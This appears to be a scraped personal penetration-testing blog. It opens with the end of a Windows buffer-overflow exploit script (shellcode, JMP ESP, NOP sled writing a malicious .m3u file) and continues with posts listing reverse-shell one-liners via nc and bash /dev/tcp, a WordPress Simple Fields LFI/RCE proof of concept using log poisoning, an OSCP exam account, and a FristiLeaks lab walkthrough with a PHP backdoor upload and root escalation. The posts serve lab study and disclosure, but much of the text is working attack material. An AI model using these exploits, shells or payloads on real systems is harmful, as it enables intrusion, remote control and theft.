+buf += "\x38\x53\x31\x48\x51\x46\x31\x4c\x4b\x36\x39\x31\x30"
+buf += "\x33\x31\x58\x53\x4c\x4b\x57\x39\x52\x38\x4b\x53\x37"
+buf += "\x4a\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x33\x31\x49\x46"
+buf += "\x56\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f\x54\x4d\x43"
+buf += "\x31\x48\x47\x47\x48\x4d\x30\x52\x55\x4b\x46\x33\x33"
+buf += "\x43\x4d\x5a\x58\x57\x4b\x53\x4d\x47\x54\x34\x35\x5a"
+buf += "\x44\x50\x58\x4c\x4b\x30\x58\x47\x54\x33\x31\x59\x43"
+buf += "\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x46\x38\x35"
+buf += "\x4c\x33\x31\x39\x43\x4c\x4b\x44\x44\x4c\x4b\x35\x51"
+buf += "\x58\x50\x4c\x49\x30\x44\x47\x54\x36\x44\x31\x4b\x31"
+buf += "\x4b\x45\x31\x30\x59\x31\x4a\x46\x31\x4b\x4f\x4b\x50"
+buf += "\x51\x4f\x31\x4f\x51\x4a\x4c\x4b\x45\x42\x5a\x4b\x4c"
+buf += "\x4d\x51\x4d\x42\x48\x47\x43\x36\x52\x43\x30\x55\x50"
+buf += "\x32\x48\x42\x57\x32\x53\x57\x42\x31\x4f\x31\x44\x42"
+buf += "\x48\x50\x4c\x54\x37\x37\x56\x34\x47\x4b\x4f\x4e\x35"
+buf += "\x48\x38\x4a\x30\x43\x31\x45\x50\x45\x50\x56\x49\x49"
+buf += "\x54\x56\x34\x30\x50\x33\x58\x57\x59\x4d\x50\x32\x4b"
+buf += "\x35\x50\x4b\x4f\x59\x45\x42\x4a\x53\x38\x51\x49\x36"
+buf += "\x30\x5a\x42\x4b\x4d\x57\x30\x46\x30\x57\x30\x30\x50"
+buf += "\x32\x48\x5a\x4a\x44\x4f\x59\x4f\x4b\x50\x4b\x4f\x48"
+buf += "\x55\x5a\x37\x33\x58\x44\x42\x43\x30\x54\x51\x31\x4c"
+buf += "\x4d\x59\x4d\x36\x52\x4a\x44\x50\x51\x46\x46\x37\x32"
+buf += "\x48\x39\x52\x49\x4b\x46\x57\x55\x37\x4b\x4f\x39\x45"
+buf += "\x30\x57\x45\x38\x58\x37\x5a\x49\x37\x48\x4b\x4f\x4b"
+buf += "\x4f\x38\x55\x46\x37\x43\x58\x34\x34\x5a\x4c\x57\x4b"
+buf += "\x4d\x31\x4b\x4f\x4e\x35\x31\x47\x5a\x37\x45\x38\x32"
+buf += "\x55\x42\x4e\x50\x4d\x43\x51\x4b\x4f\x48\x55\x33\x58"
+buf += "\x42\x43\x32\x4d\x32\x44\x43\x30\x4b\x39\x4a\x43\x51"
+buf += "\x47\x31\x47\x51\x47\x56\x51\x4c\x36\x42\x4a\x34\x52"
+buf += "\x51\x49\x30\x56\x4d\x32\x4b\x4d\x45\x36\x49\x57\x57"
+buf += "\x34\x57\x54\x47\x4c\x33\x31\x53\x31\x4c\x4d\x47\x34"
+buf += "\x37\x54\x44\x50\x48\x46\x45\x50\x51\x54\x31\x44\x30"
+buf += "\x50\x56\x36\x50\x56\x51\x46\x51\x56\x51\x46\x30\x4e"
+buf += "\x50\x56\x56\x36\x51\x43\x56\x36\x53\x58\x54\x39\x38"
+buf += "\x4c\x57\x4f\x4c\x46\x4b\x4f\x48\x55\x4b\x39\x4d\x30"
+buf += "\x50\x4e\x50\x56\x37\x36\x4b\x4f\x46\x50\x52\x48\x43"
+buf += "\x38\x4c\x47\x45\x4d\x45\x30\x4b\x4f\x49\x45\x4f\x4b"
+buf += "\x4b\x4e\x44\x4e\x47\x42\x4b\x5a\x53\x58\x4e\x46\x4a"
+buf += "\x35\x4f\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46"
+buf += "\x53\x4c\x45\x5a\x4b\x30\x4b\x4b\x4b\x50\x42\x55\x54"
+buf += "\x45\x4f\x4b\x31\x57\x54\x53\x52\x52\x52\x4f\x42\x4a"
+buf += "\x35\x50\x50\x53\x4b\x4f\x4e\x35\x41\x41"
+
+with open(r"c:\documents and settings\administrator\desktop\mal.m3u", "w") as file:
+    file.write(26064 * "A")
+    file.write("\x2a\xb2\xd4\x01") # JMP ESP
+    file.write("\x90" * 25) # NOP * 25
+    file.write(buf)
+
+print "Done"</pre>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/exploit-development/buffer-overflow/" rel="category tag">Buffer Overflow</a>, <a href="/category/exploit/exploit-development/immunity/" rel="category tag">Immunity</a>, <a href="/category/exploit/exploit-development/mona-py/" rel="category tag">mona.py</a>, <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/learning-more-about-buffer-overflow-exploits/#comments"><b>1</b> Reply</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-342 -->
+
+				
+					
+	<article id="post-335" class="post-335 post type-post status-publish format-standard hentry category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/reverse-shells-even-without-nc-on-linux/" rel="bookmark">Reverse shells even without nc on Linux</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/reverse-shells-even-without-nc-on-linux/" title="1:49 PM" rel="bookmark"><time class="entry-date" datetime="2018-04-29T13:49:55+00:00">2018-04-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/reverse-shells-even-without-nc-on-linux/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Often when I get remote command execution on a linux system for example I&#8217;ve planted my <a href="/single-line-php-script-to-gain-shell/">one line php script</a> , the next step is getting a remote shell. Usually an nc listener would be used to receive the reverse shell, and I normally start it with the -v option so that it will show when a connection is received.</p>
+<p>If nc or ncat is installed, it should be fairly simple to send the shell to my listener. Something like this should send a reverse shell to a nc listener, running on DEST_IP:DEST_PORT:</p>
+<pre>nc DEST_IP DEST_PORT -e /bin/bash</pre>
+<p>or I could set up a bind shell on the system then connect to it later using nc:</p>
+<pre>nc -lp 4444 -e /bin/bash</pre>
+<p>It should be noted that some versions of nc (e.g. BSD) don&#8217;t need the -p option if -l is specified (in fact it is not valid to use -p with -l on those versions), and some don&#8217;t have the -e option.</p>
+<p>It may be even better to use the -c switch instead of -e if it is available because then you can pass more than an executable name to execute. This example forwards stderr as well as stdout from bash:</p>
+<pre>nc DEST_IP DEST_PORT -c "/bin/bash 2&gt;&amp;1"</pre>
+<p>If there is no -e option, there are ways around it. One example is to use two nc listeners connected to bash, one to send commands and one to receive output:</p>
+<pre>nc DEST_IP DEST_PORT | /bin/bash 2&gt;&amp;1 | nc DEST_IP DEST_PORT+1</pre>
+<p>This is not very elegant, but it does work. We can temporarily create a named pipe and use that to connect to a single nc listener:</p>
+<pre>mkfifo /tmp/pipe;cat /tmp/pipe|nc DEST_IP DEST_PORT|/bin/bash &amp;&gt;/tmp/pipe;rm /tmp/pipe</pre>
+<p>There might also be ncat available on the system, which can be used just like nc in the first 4 examples above, and ncat provides options like &#8211;ssl which can be used to encrypt traffic and even verify identity..</p>
+<p>If no versions of netcat are installed, we can always try bash redirection. Check whether commands are running inside bash with:</p>
+<pre>$echo $0</pre>
+<p>or:</p>
+<pre>echo $SHELL</pre>
+<p>If commands are running in bash, then great, we can use bash&#8217;s tcp redirections like this:</p>
+<pre>bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1</pre>
+<p>This will execute bash, and forward stdout and stderr to DEST_IP:DEST_PORT and read stdin from the same. If I set up a nc listener on DEST_PORT:DEST_IP beforehand I should receive a shell.</p>
+<p>If commands are running in something like sh, which doesn&#8217;t have tcp redirection, we can check whether bash is installed with:</p>
+<pre>which bash</pre>
+<p>an if it is, just execute the commands inside bash to get redirection:</p>
+<pre>bash -c "bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1"</pre>
+<p>When sending these commands in a query string (e.g to a backdoor php file), watch out for url escaping the commands. If you&#8217;re typing them into the address bar, most browsers will url escape the characters, but ampersand (&#8220;&amp;&#8221;) often catches me out because it&#8217;s valid in a url as a query string delimiter, so it won&#8217;t be escaped for you.</p>
+<p>If there are no versions of netcat or bash installed, then it might be time to start investigating other using other languages (e.g. perl/python) to send the shell over tcp which is outside the scope of this post.</p>
+<p>Once you have a remote shell, executing interactive tools like sudo and passwd won&#8217;t work, but if python is installed, this one liner will make them work:</p>
+<pre>python -c "import pty;pty.spawn('/bin/bash')"</pre>
+<p>I&#8217;m sure it&#8217;s possible do similar things in other languages if python isn&#8217;t installed.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/reverse-shells-even-without-nc-on-linux/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-335 -->
+
+				
+					
+	<article id="post-333" class="post-333 post type-post status-publish format-standard hentry category-exploit category-exploit-db category-web-server">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/" rel="bookmark">I discovered a vulnerability in a wordpress plugin</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/" title="11:12 AM" rel="bookmark"><time class="entry-date" datetime="2018-04-29T11:12:59+00:00">2018-04-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I was reviewing some code recently that had been written by someone that I knew and I found an LFI vulnerability using directory traversal. I explained it to them and they fixed it, but not quite well enough, so I showed them again how it could be exploited in a different way, and this time the fixed it properly. Hopefully they learnt a lesson on the way that they should always sanitise user input.</p>
+<p>It was thrilling to discover an exploit like this myself so I decided to search public code repositories for obviously vulnerable lines of code. I found a wordpress plugin called simple fields that had a LFI vulnerability in due to unsanitised user input. It can even lead to RFI or RCE depending on how the web server is configured (e.g. allow_url_include is enabled or of apache logs can be poisoned and loaded). It actually looks like it was fixed in later versions because the lines containing the vulnerability were commented out, but old versions my still be installed on some sites.</p>
+<p>I submitted the vulnerability to the exploit database and <a href="https://www.exploit-db.com/exploits/44425/">it has been published here</a>.</p>
+<p>I knew how the vulnerability should work, but I needed to verify it, so I had to set up an environment to test it. The vulnerability requires version 0.2 &#8211; 0.3.5 of simple fields and it must be hosted on a system running 5.3.3 or older php. It&#8217;s pretty hard to install 5.3.3 or older php these days. There won&#8217;t be a php package of that version in any default repositories. The easiest way I found of installing it was to install camp 1.7.2 on Linux (I used Ubuntu 16.0.4)</p>
+<p>PHP &lt;5.3.4 is required because the exploit relies on the ability to inject a null byte to terminate a string before the script expects it to be and this was fixed in PHP 5.3.4</p>
+<p>The vulnerable line of code in simple_fields.php is:</p>
+<pre>require( $_GET["wp_abspath"] . './wp-blog-header.php' );</pre>
+<h1>Proof of concept LFI:</h1>
+<pre>http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00</pre>
+<p>This works because the null byte terminates the string, so the trailing &#8220;./wp-blog-header.php&#8221; is ignored.</p>
+<h1>Proof of concept RCE:</h1>
+<pre>$ echo "&lt;?system(\$_GET['cmd'])?&gt;"|nc host 80
+$ curl "http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=../../../../../logs/access_log%00&amp;cmd=id"</pre>
+<p>This works because we first poison the apache logs with some php that will run whatever command was submitted as the value for &#8220;cmd&#8221; in the query string, and then we use the LFI to include the poisoned log and the command we want to run.</p>
+<p>This vulnerability is admittedly not that likely to show up in the wild since it requires an old version of php, and an old version of a plugin that isn&#8217;t even supported any more, but it could be present on some old systems.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit/exploit-db/" rel="category tag">exploit-db</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/i-discovered-a-vulnerability-in-a-wordpress-plugin/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-333 -->
+
+				
+					
+	<article id="post-330" class="post-330 post type-post status-publish format-standard hentry category-education category-infosec category-kali category-online-course category-oscp category-pwk">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/i-passed-oscp/" rel="bookmark">I passed OSCP!</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/i-passed-oscp/" title="10:45 AM" rel="bookmark"><time class="entry-date" datetime="2018-04-29T10:45:00+00:00">2018-04-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/i-passed-oscp/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Following on from <a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/">my post a few months ago</a>, I took the <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">OSCP</a> exam about a week ago and passed first time! It&#8217;s a great course, and the training materials cover most of what is required to pass the exam, but I found that I for some subjects I ended up turning to the web for more examples and to get a deeper understanding of some of the subjects.</p>
+<p>My main challenges were:</p>
+<h2>Finding time to actually do the course</h2>
+<p>I initially signed up for 60 days of lab access on 16th July 2017 and used that time to go through the training materials and practice in the labs. About 14 of days of those were spent on holiday or away from home for some other reason. Also some days after work I was too mentally tired to do the course when I got home, and other days I felt that my wife deserved some of my time, so I really struggled to get a decent amount of time logged in the labs. I took a week off work to get more time devoted to the labs and then I was able to get the most of the course exercises completed, but I hadn&#8217;t pwned many lab systems by the time my 60 days were up. After practicing outside the labs (<a href="https://www.vulnhub.com/">vulnhub</a> and <a href="https://www.hackthebox.eu/">hackthebox</a>), I bought another 30 days of lab time, starting 23rd December, because I had a few days off work around Christmas and the New year, and I also took a day or two off work near then end of January. This time I managed to finish the course exercises and hack into more than the 10 systems that are required to get the 5 bonus points for the exam but I didn&#8217;t feel I was ready for the exam so I did more practice outside the labs again.</p>
+<h2>Finding vulnerabilities:</h2>
+<p>I found it took me a long time to find a way into the vulnerable systems in the labs &#8211; longer than what a lot of people were saying it took them in the forums. That was frustrating, but the only real solution to that was to practice and that&#8217;s really what the labs are for. I also used <a href="https://www.vulnhub.com/">vulnhub</a> and <a href="https://www.hackthebox.eu/">hackthebox</a> for practice.</p>
+<h2>Getting remote shells</h2>
+<p>Even when I had remote command execution on some systems, it took me ages to get a remote shell. Often the systems didn&#8217;t have nc installed, or even bash, and other times characters like &#8220;&gt;&#8221; or &#8220;|&#8221; were stripped so I had to find very creative ways of getting remote shells.</p>
+<h2>Reporting</h2>
+<p>I didn&#8217;t take many screenshots while doing the course materials, just basic textual notes, and when it came to writing the report, I found that I had to work through all the exercises again to get all the info required to write them up and also re-pwn the machines that I had already pwned, and this wasted a lot of time. I should have written the report as I went through, or all least keep the report up to date with what I had done every week or so.</p>
+<h1>The Exam</h1>
+<p>I knew that an exam sitting is included in every purchase of lab time and I clearly wasn&#8217;t ready after the first 60 days of lab access expired, so I never booked that exam. After the 30 days of extra lab time I still didn&#8217;t feel ready but I decided I might as well book the exam, and if I failed I hadn&#8217;t lost anything and hopefully I would get an idea of what the exam would be like and what I needed to focus my practice time on. I think that mindset actually helped, since I wasn&#8217;t feeling very stressed in the buildup to the exam. I started out pretty slowly, and after about 14.5 hours with only 35 points out of the 70 required to pass the exam I went to bed, fairly sure I was going to fail. I woke up 5 hours later and went back to work, then suddenly started making progress. Those 35 remaining points were in sight, but now I was running out of time! These final few hours were pretty stressful since I was so close, but I felt it was just out of my grasp. After 23 hours and 15 minutes, with 30 minutes to spare, I got a root shell on the last machine that I needed, giving me (I think) 75 points. The whole of the day following the exam was spent writing up the report for the exam and polishing the lab report in case I needed those 5 extra bonus points. By the time I submitted the report, by brain was done. My wife suggested we get some food and a drink to celebrate ate a nearby pub, which I was happy to do, but I was not good company because I was so tired. I think she had a better conversation with the dog than with me, that evening.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/education/" rel="category tag">Education</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/kali/" rel="category tag">Kali</a>, <a href="/category/education/online-course/" rel="category tag">Online Course</a>, <a href="/category/education/online-course/oscp/" rel="category tag">OSCP</a>, <a href="/category/pwk/" rel="category tag">PWK</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/i-passed-oscp/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-330 -->
+
+				
+					
+	<article id="post-321" class="post-321 post type-post status-publish format-standard hentry category-compromise category-infosec category-linux category-passwords category-pentest category-php category-python category-shell category-unix category-web-server">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/fristileaks-1-3/" rel="bookmark">FristiLeaks 1.3</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/fristileaks-1-3/" title="11:29 AM" rel="bookmark"><time class="entry-date" datetime="2017-10-22T11:29:27+00:00">2017-10-22</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/fristileaks-1-3/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/compromise/" rel="category tag">Compromise</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/passwords/" rel="category tag">Passwords</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/development/python/" rel="category tag">Python</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/fristileaks-1-3/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-321 -->
+
+				
+					
+	<article id="post-312" class="post-312 post type-post status-publish format-standard hentry category-exploit category-infosec category-pentest category-php category-shell category-uncategorized category-unix category-web-server">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/kioptrix-2014/" rel="bookmark">Kioptrix 2014</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/kioptrix-2014/" title="8:48 PM" rel="bookmark"><time class="entry-date" datetime="2017-10-12T20:48:43+00:00">2017-10-12</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/kioptrix-2014/#comments">1</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
+<p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
+<p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
